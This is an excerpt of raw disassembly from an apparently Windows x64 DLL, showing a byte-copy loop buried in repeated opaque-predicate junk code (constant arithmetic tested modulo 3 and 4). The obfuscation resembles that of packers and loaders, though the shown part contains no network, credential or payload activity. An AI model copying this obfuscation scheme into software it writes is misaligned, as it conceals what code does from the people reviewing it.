   180002bdf:	eb 1c                	jmp    0x180002bfd
   180002be1:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002be7:	03 c3                	add    %ebx,%eax
   180002be9:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002bef:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002bf5:	03 c3                	add    %ebx,%eax
   180002bf7:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002bfd:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002c03:	b8 56 55 55 55       	mov    $0x55555556,%eax
   180002c08:	f7 e9                	imul   %ecx
   180002c0a:	8b c2                	mov    %edx,%eax
   180002c0c:	c1 e8 1f             	shr    $0x1f,%eax
   180002c0f:	03 d0                	add    %eax,%edx
   180002c11:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002c14:	3b c8                	cmp    %eax,%ecx
   180002c16:	74 c9                	je     0x180002be1
   180002c18:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180002c1d:	41 ff c8             	dec    %r8d
   180002c20:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002c26:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002c2c:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180002c32:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002c38:	03 c8                	add    %eax,%ecx
   180002c3a:	b8 56 55 55 55       	mov    $0x55555556,%eax
   180002c3f:	f7 e9                	imul   %ecx
   180002c41:	8b c2                	mov    %edx,%eax
   180002c43:	c1 e8 1f             	shr    $0x1f,%eax
   180002c46:	03 d0                	add    %eax,%edx
   180002c48:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002c4b:	3b c8                	cmp    %eax,%ecx
   180002c4d:	74 4c                	je     0x180002c9b
   180002c4f:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002c55:	41 03 cf             	add    %r15d,%ecx
   180002c58:	41 03 cd             	add    %r13d,%ecx
   180002c5b:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002c61:	b9 03 00 00 80       	mov    $0x80000003,%ecx
   180002c66:	eb 1c                	jmp    0x180002c84
   180002c68:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002c6e:	03 c3                	add    %ebx,%eax
   180002c70:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002c76:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002c7c:	03 c3                	add    %ebx,%eax
   180002c7e:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002c84:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002c8a:	23 c1                	and    %ecx,%eax
   180002c8c:	7d 07                	jge    0x180002c95
   180002c8e:	2b c3                	sub    %ebx,%eax
   180002c90:	83 c8 fc             	or     $0xfffffffc,%eax
   180002c93:	03 c3                	add    %ebx,%eax
   180002c95:	85 c0                	test   %eax,%eax
   180002c97:	74 cf                	je     0x180002c68
   180002c99:	eb 53                	jmp    0x180002cee
   180002c9b:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002ca1:	41 8b cf             	mov    %r15d,%ecx
   180002ca4:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002caa:	41 2b cd             	sub    %r13d,%ecx
   180002cad:	03 c8                	add    %eax,%ecx
   180002caf:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002cb5:	eb 1c                	jmp    0x180002cd3
   180002cb7:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002cbd:	03 c3                	add    %ebx,%eax
   180002cbf:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002cc5:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002ccb:	03 c3                	add    %ebx,%eax
   180002ccd:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002cd3:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002cd9:	b8 56 55 55 55       	mov    $0x55555556,%eax
   180002cde:	f7 e9                	imul   %ecx
   180002ce0:	8b c2                	mov    %edx,%eax
   180002ce2:	c1 e8 1f             	shr    $0x1f,%eax
   180002ce5:	03 d0                	add    %eax,%edx
   180002ce7:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002cea:	3b c8                	cmp    %eax,%ecx
   180002cec:	74 c9                	je     0x180002cb7
   180002cee:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180002cf3:	48 03 f3             	add    %rbx,%rsi
   180002cf6:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002cfc:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002d02:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180002d08:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002d0e:	03 c8                	add    %eax,%ecx
   180002d10:	b8 56 55 55 55       	mov    $0x55555556,%eax
   180002d15:	f7 e9                	imul   %ecx
   180002d17:	8b c2                	mov    %edx,%eax
   180002d19:	c1 e8 1f             	shr    $0x1f,%eax
   180002d1c:	03 d0                	add    %eax,%edx
   180002d1e:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002d21:	3b c8                	cmp    %eax,%ecx
   180002d23:	74 4f                	je     0x180002d74
   180002d25:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002d2b:	41 03 cf             	add    %r15d,%ecx
   180002d2e:	41 03 cd             	add    %r13d,%ecx
   180002d31:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002d37:	b9 03 00 00 80       	mov    $0x80000003,%ecx
   180002d3c:	eb 1c                	jmp    0x180002d5a
   180002d3e:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002d44:	03 c3                	add    %ebx,%eax
   180002d46:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002d4c:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002d52:	03 c3                	add    %ebx,%eax
   180002d54:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002d5a:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002d60:	23 c1                	and    %ecx,%eax
   180002d62:	7d 07                	jge    0x180002d6b
   180002d64:	2b c3                	sub    %ebx,%eax
   180002d66:	83 c8 fc             	or     $0xfffffffc,%eax
   180002d69:	03 c3                	add    %ebx,%eax
   180002d6b:	85 c0                	test   %eax,%eax
   180002d6d:	74 cf                	je     0x180002d3e
   180002d6f:	e9 90 03 00 00       	jmp    0x180003104
   180002d74:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002d7a:	41 8b cf             	mov    %r15d,%ecx
   180002d7d:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002d83:	41 2b cd             	sub    %r13d,%ecx
   180002d86:	03 c8                	add    %eax,%ecx
   180002d88:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002d8e:	eb 1c                	jmp    0x180002dac
   180002d90:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002d96:	03 c3                	add    %ebx,%eax
   180002d98:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002d9e:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002da4:	03 c3                	add    %ebx,%eax
   180002da6:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002dac:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002db2:	b8 56 55 55 55       	mov    $0x55555556,%eax
   180002db7:	f7 e9                	imul   %ecx
   180002db9:	8b c2                	mov    %edx,%eax
   180002dbb:	c1 e8 1f             	shr    $0x1f,%eax
   180002dbe:	03 d0                	add    %eax,%edx
   180002dc0:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002dc3:	3b c8                	cmp    %eax,%ecx
   180002dc5:	74 c9                	je     0x180002d90
   180002dc7:	e9 38 03 00 00       	jmp    0x180003104
   180002dcc:	b8 56 55 55 55       	mov    $0x55555556,%eax
   180002dd1:	f7 e9                	imul   %ecx
   180002dd3:	8b c2                	mov    %edx,%eax
   180002dd5:	c1 e8 1f             	shr    $0x1f,%eax
   180002dd8:	03 d0                	add    %eax,%edx
   180002dda:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002ddd:	3b c8                	cmp    %eax,%ecx
   180002ddf:	74 4c                	je     0x180002e2d
   180002de1:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002de7:	41 03 cf             	add    %r15d,%ecx
   180002dea:	41 03 cd             	add    %r13d,%ecx
   180002ded:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002df3:	b9 03 00 00 80       	mov    $0x80000003,%ecx
   180002df8:	eb 1c                	jmp    0x180002e16
   180002dfa:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002e00:	03 c3                	add    %ebx,%eax
   180002e02:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002e08:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002e0e:	03 c3                	add    %ebx,%eax
   180002e10:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002e16:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002e1c:	23 c1                	and    %ecx,%eax
   180002e1e:	7d 07                	jge    0x180002e27
   180002e20:	2b c3                	sub    %ebx,%eax
   180002e22:	83 c8 fc             	or     $0xfffffffc,%eax
   180002e25:	03 c3                	add    %ebx,%eax
   180002e27:	85 c0                	test   %eax,%eax
   180002e29:	74 cf                	je     0x180002dfa
   180002e2b:	eb 53                	jmp    0x180002e80
   180002e2d:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002e33:	41 8b cf             	mov    %r15d,%ecx
   180002e36:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002e3c:	41 2b cd             	sub    %r13d,%ecx
   180002e3f:	03 c8                	add    %eax,%ecx
   180002e41:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002e47:	eb 1c                	jmp    0x180002e65
   180002e49:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002e4f:	03 c3                	add    %ebx,%eax
   180002e51:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002e57:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002e5d:	03 c3                	add    %ebx,%eax
   180002e5f:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002e65:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002e6b:	b8 56 55 55 55       	mov    $0x55555556,%eax
   180002e70:	f7 e9                	imul   %ecx
   180002e72:	8b c2                	mov    %edx,%eax
   180002e74:	c1 e8 1f             	shr    $0x1f,%eax
   180002e77:	03 d0                	add    %eax,%edx
   180002e79:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002e7c:	3b c8                	cmp    %eax,%ecx
   180002e7e:	74 c9                	je     0x180002e49
   180002e80:	8a 06                	mov    (%rsi),%al
   180002e82:	41 88 02             	mov    %al,(%r10)
   180002e85:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180002e8a:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002e90:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002e96:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180002e9c:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002ea2:	03 c8                	add    %eax,%ecx
   180002ea4:	b8 56 55 55 55       	mov    $0x55555556,%eax
   180002ea9:	f7 e9                	imul   %ecx
   180002eab:	8b c2                	mov    %edx,%eax
   180002ead:	c1 e8 1f             	shr    $0x1f,%eax
   180002eb0:	03 d0                	add    %eax,%edx
   180002eb2:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002eb5:	3b c8                	cmp    %eax,%ecx
   180002eb7:	74 4c                	je     0x180002f05
   180002eb9:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002ebf:	41 03 cf             	add    %r15d,%ecx
   180002ec2:	41 03 cd             	add    %r13d,%ecx
   180002ec5:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002ecb:	b9 03 00 00 80       	mov    $0x80000003,%ecx
   180002ed0:	eb 1c                	jmp    0x180002eee
   180002ed2:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002ed8:	03 c3                	add    %ebx,%eax
   180002eda:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002ee0:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002ee6:	03 c3                	add    %ebx,%eax
   180002ee8:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002eee:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002ef4:	23 c1                	and    %ecx,%eax
   180002ef6:	7d 07                	jge    0x180002eff
   180002ef8:	2b c3                	sub    %ebx,%eax
   180002efa:	83 c8 fc             	or     $0xfffffffc,%eax
   180002efd:	03 c3                	add    %ebx,%eax
   180002eff:	85 c0                	test   %eax,%eax
   180002f01:	74 cf                	je     0x180002ed2
   180002f03:	eb 53                	jmp    0x180002f58
   180002f05:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002f0b:	41 8b cf             	mov    %r15d,%ecx
   180002f0e:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002f14:	41 2b cd             	sub    %r13d,%ecx
   180002f17:	03 c8                	add    %eax,%ecx
   180002f19:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002f1f:	eb 1c                	jmp    0x180002f3d
   180002f21:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002f27:	03 c3                	add    %ebx,%eax
   180002f29:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002f2f:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002f35:	03 c3                	add    %ebx,%eax
   180002f37:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002f3d:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002f43:	b8 56 55 55 55       	mov    $0x55555556,%eax
   180002f48:	f7 e9                	imul   %ecx
   180002f4a:	8b c2                	mov    %edx,%eax
   180002f4c:	c1 e8 1f             	shr    $0x1f,%eax
   180002f4f:	03 d0                	add    %eax,%edx
   180002f51:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002f54:	3b c8                	cmp    %eax,%ecx
   180002f56:	74 c9                	je     0x180002f21
   180002f58:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180002f5d:	4c 03 d3             	add    %rbx,%r10
   180002f60:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002f66:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002f6c:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180002f72:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002f78:	03 c8                	add    %eax,%ecx
   180002f7a:	b8 56 55 55 55       	mov    $0x55555556,%eax
   180002f7f:	f7 e9                	imul   %ecx
   180002f81:	8b c2                	mov    %edx,%eax
   180002f83:	c1 e8 1f             	shr    $0x1f,%eax
   180002f86:	03 d0                	add    %eax,%edx
   180002f88:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002f8b:	3b c8                	cmp    %eax,%ecx
   180002f8d:	74 4c                	je     0x180002fdb
   180002f8f:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002f95:	41 03 cf             	add    %r15d,%ecx
   180002f98:	41 03 cd             	add    %r13d,%ecx
   180002f9b:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002fa1:	b9 03 00 00 80       	mov    $0x80000003,%ecx
   180002fa6:	eb 1c                	jmp    0x180002fc4
   180002fa8:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002fae:	03 c3                	add    %ebx,%eax
   180002fb0:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002fb6:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002fbc:	03 c3                	add    %ebx,%eax
   180002fbe:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002fc4:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002fca:	23 c1                	and    %ecx,%eax
   180002fcc:	7d 07                	jge    0x180002fd5
   180002fce:	2b c3                	sub    %ebx,%eax
   180002fd0:	83 c8 fc             	or     $0xfffffffc,%eax
   180002fd3:	03 c3                	add    %ebx,%eax
   180002fd5:	85 c0                	test   %eax,%eax
   180002fd7:	74 cf                	je     0x180002fa8
   180002fd9:	eb 53                	jmp    0x18000302e
   180002fdb:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002fe1:	41 8b cf             	mov    %r15d,%ecx
   180002fe4:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002fea:	41 2b cd             	sub    %r13d,%ecx
   180002fed:	03 c8                	add    %eax,%ecx
   180002fef:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002ff5:	eb 1c                	jmp    0x180003013
   180002ff7:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002ffd:	03 c3                	add    %ebx,%eax
   180002fff:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003005:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000300b:	03 c3                	add    %ebx,%eax
   18000300d:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003013:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003019:	b8 56 55 55 55       	mov    $0x55555556,%eax
   18000301e:	f7 e9                	imul   %ecx
   180003020:	8b c2                	mov    %edx,%eax
   180003022:	c1 e8 1f             	shr    $0x1f,%eax
   180003025:	03 d0                	add    %eax,%edx
   180003027:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000302a:	3b c8                	cmp    %eax,%ecx
   18000302c:	74 c9                	je     0x180002ff7
   18000302e:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180003033:	48 03 f3             	add    %rbx,%rsi
   180003036:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000303c:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003042:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180003048:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000304e:	03 c8                	add    %eax,%ecx
   180003050:	b8 56 55 55 55       	mov    $0x55555556,%eax
   180003055:	f7 e9                	imul   %ecx
   180003057:	8b c2                	mov    %edx,%eax
   180003059:	c1 e8 1f             	shr    $0x1f,%eax
   18000305c:	03 d0                	add    %eax,%edx
   18000305e:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003061:	3b c8                	cmp    %eax,%ecx
   180003063:	74 4c                	je     0x1800030b1
   180003065:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000306b:	41 03 cf             	add    %r15d,%ecx
   18000306e:	41 03 cd             	add    %r13d,%ecx
   180003071:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180003077:	b9 03 00 00 80       	mov    $0x80000003,%ecx
   18000307c:	eb 1c                	jmp    0x18000309a
   18000307e:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003084:	03 c3                	add    %ebx,%eax
   180003086:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000308c:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003092:	03 c3                	add    %ebx,%eax
   180003094:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000309a:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800030a0:	23 c1                	and    %ecx,%eax
   1800030a2:	7d 07                	jge    0x1800030ab
   1800030a4:	2b c3                	sub    %ebx,%eax
   1800030a6:	83 c8 fc             	or     $0xfffffffc,%eax
   1800030a9:	03 c3                	add    %ebx,%eax
   1800030ab:	85 c0                	test   %eax,%eax
   1800030ad:	74 cf                	je     0x18000307e
   1800030af:	eb 53                	jmp    0x180003104
   1800030b1:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800030b7:	41 8b cf             	mov    %r15d,%ecx
   1800030ba:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800030c0:	41 2b cd             	sub    %r13d,%ecx
   1800030c3:	03 c8                	add    %eax,%ecx
   1800030c5:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800030cb:	eb 1c                	jmp    0x1800030e9
   1800030cd:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800030d3:	03 c3                	add    %ebx,%eax
   1800030d5:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800030db:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800030e1:	03 c3                	add    %ebx,%eax
   1800030e3:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800030e9:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800030ef:	b8 56 55 55 55       	mov    $0x55555556,%eax
   1800030f4:	f7 e9                	imul   %ecx
   1800030f6:	8b c2                	mov    %edx,%eax
   1800030f8:	c1 e8 1f             	shr    $0x1f,%eax
   1800030fb:	03 d0                	add    %eax,%edx
   1800030fd:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003100:	3b c8                	cmp    %eax,%ecx
   180003102:	74 c9                	je     0x1800030cd
   180003104:	8b 44 24 24          	mov    0x24(%rsp),%eax
   180003108:	44 03 c3             	add    %ebx,%r8d
   18000310b:	44 3b c0             	cmp    %eax,%r8d
   18000310e:	0f 82 a7 f7 ff ff    	jb     0x1800028bb
   180003114:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180003119:	41 b9 56 55 55 55    	mov    $0x55555556,%r9d
   18000311f:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003125:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000312b:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180003131:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003137:	03 c8                	add    %eax,%ecx
   180003139:	41 8b c1             	mov    %r9d,%eax
   18000313c:	f7 e9                	imul   %ecx
   18000313e:	8b c2                	mov    %edx,%eax
   180003140:	c1 e8 1f             	shr    $0x1f,%eax
   180003143:	03 d0                	add    %eax,%edx
   180003145:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003148:	3b c8                	cmp    %eax,%ecx
   18000314a:	74 52                	je     0x18000319e
   18000314c:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003152:	be 03 00 00 80       	mov    $0x80000003,%esi
   180003157:	41 03 cf             	add    %r15d,%ecx
   18000315a:	41 03 cd             	add    %r13d,%ecx
   18000315d:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180003163:	eb 1c                	jmp    0x180003181
   180003165:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000316b:	03 c3                	add    %ebx,%eax
   18000316d:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003173:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003179:	03 c3                	add    %ebx,%eax
   18000317b:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003181:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003187:	23 c6                	and    %esi,%eax
   180003189:	7d 07                	jge    0x180003192
   18000318b:	2b c3                	sub    %ebx,%eax
   18000318d:	83 c8 fc             	or     $0xfffffffc,%eax
   180003190:	03 c3                	add    %ebx,%eax
   180003192:	85 c0                	test   %eax,%eax
   180003194:	74 cf                	je     0x180003165
   180003196:	41 ba 01 00 00 80    	mov    $0x80000001,%r10d
   18000319c:	eb 5c                	jmp    0x1800031fa
   18000319e:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800031a4:	41 8b cf             	mov    %r15d,%ecx
   1800031a7:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800031ad:	41 2b cd             	sub    %r13d,%ecx
   1800031b0:	03 c8                	add    %eax,%ecx
   1800031b2:	41 ba 01 00 00 80    	mov    $0x80000001,%r10d
   1800031b8:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800031be:	eb 1c                	jmp    0x1800031dc
   1800031c0:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800031c6:	03 c3                	add    %ebx,%eax
   1800031c8:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800031ce:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800031d4:	03 c3                	add    %ebx,%eax
   1800031d6:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800031dc:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800031e2:	41 8b c1             	mov    %r9d,%eax
   1800031e5:	f7 e9                	imul   %ecx
   1800031e7:	8b c2                	mov    %edx,%eax
   1800031e9:	c1 e8 1f             	shr    $0x1f,%eax
   1800031ec:	03 d0                	add    %eax,%edx
   1800031ee:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800031f1:	3b c8                	cmp    %eax,%ecx
   1800031f3:	74 cb                	je     0x1800031c0
   1800031f5:	be 03 00 00 80       	mov    $0x80000003,%esi
   1800031fa:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   1800031ff:	41 b8 67 66 66 66    	mov    $0x66666667,%r8d
   180003205:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000320b:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003211:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180003217:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000321d:	03 c8                	add    %eax,%ecx
   18000321f:	41 8b c1             	mov    %r9d,%eax
   180003222:	f7 e9                	imul   %ecx
   180003224:	8b c2                	mov    %edx,%eax
   180003226:	c1 e8 1f             	shr    $0x1f,%eax
   180003229:	03 d0                	add    %eax,%edx
   18000322b:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000322e:	3b c8                	cmp    %eax,%ecx
   180003230:	74 4a                	je     0x18000327c
   180003232:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003238:	41 03 cf             	add    %r15d,%ecx
   18000323b:	41 03 cd             	add    %r13d,%ecx
   18000323e:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180003244:	eb 1c                	jmp    0x180003262
   180003246:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000324c:	03 c3                	add    %ebx,%eax
   18000324e:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003254:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000325a:	03 c3                	add    %ebx,%eax
   18000325c:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003262:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003268:	23 c6                	and    %esi,%eax
   18000326a:	7d 07                	jge    0x180003273
   18000326c:	2b c3                	sub    %ebx,%eax
   18000326e:	83 c8 fc             	or     $0xfffffffc,%eax
   180003271:	03 c3                	add    %ebx,%eax
   180003273:	85 c0                	test   %eax,%eax
   180003275:	74 cf                	je     0x180003246
   180003277:	e9 5b 01 00 00       	jmp    0x1800033d7
   18000327c:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003282:	41 23 c2             	and    %r10d,%eax
   180003285:	7d 07                	jge    0x18000328e
   180003287:	2b c3                	sub    %ebx,%eax
   180003289:	83 c8 fe             	or     $0xfffffffe,%eax
   18000328c:	03 c3                	add    %ebx,%eax
   18000328e:	85 c0                	test   %eax,%eax
   180003290:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003296:	74 4a                	je     0x1800032e2
   180003298:	41 8b cf             	mov    %r15d,%ecx
   18000329b:	41 2b cd             	sub    %r13d,%ecx
   18000329e:	03 c8                	add    %eax,%ecx
   1800032a0:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800032a6:	eb 1c                	jmp    0x1800032c4
   1800032a8:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800032ae:	03 c3                	add    %ebx,%eax
   1800032b0:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800032b6:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800032bc:	03 c3                	add    %ebx,%eax
   1800032be:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800032c4:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800032ca:	41 8b c1             	mov    %r9d,%eax
   1800032cd:	f7 e9                	imul   %ecx
   1800032cf:	8b c2                	mov    %edx,%eax
   1800032d1:	c1 e8 1f             	shr    $0x1f,%eax
   1800032d4:	03 d0                	add    %eax,%edx
   1800032d6:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800032d9:	3b c8                	cmp    %eax,%ecx
   1800032db:	74 cb                	je     0x1800032a8
   1800032dd:	e9 f5 00 00 00       	jmp    0x1800033d7
   1800032e2:	23 c6                	and    %esi,%eax
   1800032e4:	7d 07                	jge    0x1800032ed
   1800032e6:	2b c3                	sub    %ebx,%eax
   1800032e8:	83 c8 fc             	or     $0xfffffffc,%eax
   1800032eb:	03 c3                	add    %ebx,%eax
   1800032ed:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800032f3:	85 c0                	test   %eax,%eax
   1800032f5:	74 65                	je     0x18000335c
